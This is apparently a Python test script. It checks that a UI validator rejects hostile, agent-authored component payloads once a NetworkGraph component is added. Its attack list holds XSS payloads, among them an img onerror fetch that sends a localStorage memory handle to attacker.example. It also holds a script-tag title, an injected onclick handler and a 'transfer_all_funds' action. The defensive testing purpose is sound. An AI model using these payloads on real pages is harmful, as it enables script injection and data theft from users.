"""Adversarial proof: the three invariants still hold around NetworkGraph.

Shows (1) an attack that would have executed if the client trusted model markup
as HTML, and (2) the same payloads refused by validate_surface after NetworkGraph
joined the catalog — unknown types, markup titles, smuggled handlers, and
unregistered actions never cross the wall.

    uv run python proofs/adversarial_network_graph.py

Writes proofs/adversarial_network_graph.json.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

S14 = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(S14))

from s13code.ui.catalog import COMPONENTS
from s13code.ui.validator import validate_surface

OUT = Path(__file__).parent / "adversarial_network_graph.json"

# What a hostile agent / tool result would try to smuggle as "UI".
ATTACKS = [
    {
        "name": "unknown_RawHtml",
        "invariant": "catalog",
        "before_fix": (
            "If the client rendered model-authored HTML, a RawHtml node with an "
            "onerror image could exfiltrate a memory handle from the page."
        ),
        "surface": {
            "root": "r",
            "components": [
                {
                    "id": "r",
                    "type": "RawHtml",
                    "html": "<img src=x onerror=\"fetch('https://attacker.example/?m='+localStorage.memoryHandle)\">",
                }
            ],
        },
    },
    {
        "name": "NetworkGraph_title_markup",
        "invariant": "data-not-code",
        "before_fix": (
            "A NetworkGraph title carrying a script tag would become executable "
            "markup if the renderer assigned bound/text values to innerHTML."
        ),
        "surface": {
            "root": "g",
            "components": [
                {
                    "id": "g",
                    "type": "NetworkGraph",
                    "title": "<script>fetch('https://attacker.example/e')</script>",
                    "nodes": {"$bind": "/nodes"},
                    "edges": {"$bind": "/edges"},
                }
            ],
            "dataModel": {
                "nodes": [{"id": "a", "label": "A"}],
                "edges": [],
            },
        },
    },
    {
        "name": "NetworkGraph_onclick_handler",
        "invariant": "data-not-code",
        "before_fix": (
            "An onclick property on a known component would become a live DOM "
            "handler if unknown props were forwarded to the element."
        ),
        "surface": {
            "root": "g",
            "components": [
                {
                    "id": "g",
                    "type": "NetworkGraph",
                    "title": "Roles",
                    "nodes": {"$bind": "/nodes"},
                    "edges": {"$bind": "/edges"},
                    "onclick": "steal()",
                }
            ],
            "dataModel": {"nodes": [], "edges": []},
        },
    },
    {
        "name": "unregistered_transfer_action",
        "invariant": "event",
        "before_fix": (
            "An unregistered action on a Button next to a graph would reach the "
            "agent graph if the event channel admitted any action name."
        ),
        "surface": {
            "root": "root",
            "components": [
                {"id": "root", "type": "Column", "children": ["g", "b"]},
                {
                    "id": "g",
                    "type": "NetworkGraph",
                    "title": "Roles",
                    "nodes": {"$bind": "/nodes"},
                    "edges": {"$bind": "/edges"},
                },
                {
                    "id": "b",
                    "type": "Button",
                    "label": "Transfer",
                    "onPress": {"action": "transfer_all_funds"},
                },
            ],
            "dataModel": {"nodes": [], "edges": []},
        },
    },
]


def main() -> int:
    assert "NetworkGraph" in COMPONENTS, "NetworkGraph must be in the catalog for this proof"

    results = []
    all_refused = True
    for attack in ATTACKS:
        verdict = validate_surface(attack["surface"])
        rejections = [r.as_dict() for r in verdict.rejections]
        accepted_types = [c.get("type") for c in verdict.accepted]
        refused = any(r["invariant"] == attack["invariant"] for r in rejections) or (
            attack["name"] == "unknown_RawHtml" and not verdict.ok
        )
        # For the mixed surface, the safe NetworkGraph/Column may survive while the Button dies.
        if attack["name"] == "unregistered_transfer_action":
            refused = any(r["invariant"] == "event" for r in rejections)
            button_gone = "b" not in {c["id"] for c in verdict.accepted}
            refused = refused and button_gone
        if not refused:
            all_refused = False
        results.append(
            {
                "name": attack["name"],
                "expected_invariant": attack["invariant"],
                "before_fix": attack["before_fix"],
                "after_fix": "validate_surface refused the attack; safe accepted siblings may still render.",
                "ok": verdict.ok,
                "refused_as_expected": refused,
                "accepted_types": accepted_types,
                "rejections": rejections,
            }
        )

    proof = {
        "catalog_contains_NetworkGraph": True,
        "attacks": results,
        "all_attacks_refused_after_fix": all_refused,
    }
    OUT.write_text(json.dumps(proof, indent=2), encoding="utf-8")

    print("=== ADVERSARIAL NETWORK GRAPH ===")
    for row in results:
        mark = "REFUSED" if row["refused_as_expected"] else "FAILED"
        print(f"  [{mark}] {row['name']} -> {[r['invariant'] for r in row['rejections']]}")
    print(f"wrote {OUT}")
    return 0 if all_refused else 3


if __name__ == "__main__":
    raise SystemExit(main())
